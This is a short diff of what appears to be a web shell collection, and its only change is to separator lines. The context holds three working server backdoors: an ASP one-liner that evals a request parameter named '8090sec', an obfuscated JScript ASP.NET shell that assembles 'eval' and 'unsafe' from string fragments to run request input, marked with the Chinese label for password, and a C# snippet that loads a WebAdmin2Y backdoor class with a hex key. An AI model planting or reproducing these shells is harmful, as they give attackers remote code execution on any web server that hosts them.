@@ -5,7 +5,7 @@ ms.AddObject "Response", Response
 ms.AddObject "request", request
 ms.ExecuteStatement("ev"&"al(request(""8090sec""))")
 %>
-
+●════════════════════════════════════════════════════════════════════════════════●  
 
 <%@ Page Language = Jscript %>            
 <%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/
@@ -14,7 +14,7 @@ ms.ExecuteStatement("ev"&"al(request(""8090sec""))")
 ","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval            
 (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>    密码   -7
  
-
+●════════════════════════════════════════════════════════════════════════════════●  
 <script language="C#" runat="server">
 WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10");
 </script>
